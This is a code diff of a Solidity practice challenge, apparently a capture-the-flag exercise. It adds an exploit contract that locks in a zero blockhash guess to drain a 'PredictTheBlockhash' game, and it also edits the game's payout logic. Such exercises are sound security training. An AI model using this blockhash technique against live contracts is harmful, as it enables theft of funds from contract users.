@@ -37,8 +37,9 @@ contract PredictTheBlockhash {
         bytes32 answer = blockhash(settlementBlockNumber);
 
         guesser = address(0);
+        require(guess == answer, "not equal");
         if (guess == answer) {
-            (bool ok, ) = msg.sender.call{value: 2 ether}("");
+            (bool ok, ) = msg.sender.call{value: address(this).balance}("");
             require(ok, "Transfer to msg.sender failed");
         }
     }
@@ -53,4 +54,15 @@ contract ExploitContract {
     }
 
     // write your exploit code below
+    function lockInGuess() external payable {
+        // bytes32 guess = bytes32(0);
+        bytes32 guess = blockhash(block.number + 1);
+        predictTheBlockhash.lockInGuess{value: 1 ether}(guess);
+    }
+
+    function settle() external {
+        predictTheBlockhash.settle();
+    }
+    
+    receive() external payable {}
 }
